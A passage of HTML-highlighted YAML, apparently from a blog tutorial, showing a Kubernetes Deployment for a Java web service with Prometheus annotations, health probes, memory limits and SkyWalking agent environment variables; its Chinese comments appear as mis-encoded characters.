&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;prometheus.io/port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;2112&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#é‡‡é›†æš´éœ²çš„ç›‘æ§ç«¯å£&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;prometheus.io/scrape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#æ‰“å¼€é‡‡é›†å¼€å…³&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;labels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;imagePullSecrets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ç¬¬äºŒç‚¹ï¼šæ·»åŠ æƒé™&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;my-docker&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#åªæœ‰è¯¥ç”¨æˆ·æ‰æœ‰pullé•œåƒçš„æƒé™&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;hb.ops.top/ops/java-web:5917f92c&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;imagePullPolicy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;IfNotPresent&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;readinessProbe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ç¬¬ä¸‰ç‚¹ï¼šæ–°å¢å­˜æ´»æ£€æµ‹ï¼Œå½“å‰æ˜¯é’ˆå¯¹ç›‘æ§ç«¯å£è¿›è¡Œå­˜æ´»æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰å½“ç›‘æ§ç«¯å£èµ·æ¥äº†ï¼Œç¨‹åºæ‰ç®—å®Œå…¨å¯åŠ¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;httpGet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2112&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/metrics/prometheus&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;initialDelaySeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;successThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;failureThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;timeoutSeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;startupProbe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;httpGet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2112&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/metrics/prometheus&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;initialDelaySeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;successThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;failureThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;timeoutSeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;livenessProbe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;httpGet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2112&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/metrics/prometheus&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;initialDelaySeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;successThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;failureThreshold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;timeoutSeconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;resources&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ç¬¬å››ç‚¹ï¼šè®¾ç½®èµ„æºé™åˆ¶ï¼Œå¦‚æœæ˜¯javaç¨‹åºï¼Œå»ºè®®limitæ¯”requestå¤§ï¼Œè¿™æ ·å¯ä»¥åˆç†åˆ†é…å †å†…å­˜å’Œéå †å†…å­˜&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;memory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;1024Mi&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;limits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;memory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;2048Mi&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;web-port&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containerPort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8889&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ç¬¬äº”ç‚¹ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æ—¶åŒºï¼ŒæŒ‡å®šEVNç¯å¢ƒï¼Œæ·»åŠ JAVAå‚æ•°ç­‰&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;JVM_OPTS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;-&lt;span class=&#34;l&#34;&gt;javaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TZ&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Asia/Shanghai&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;APOLLO_LABEL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;gray&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;SW_AGENT_NAME&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;k8s-java-web&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;SW_AGENT_COLLECTOR_BACKEND_SERVICES&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;10.0.0.123:11800&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;              &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;prod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;---&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
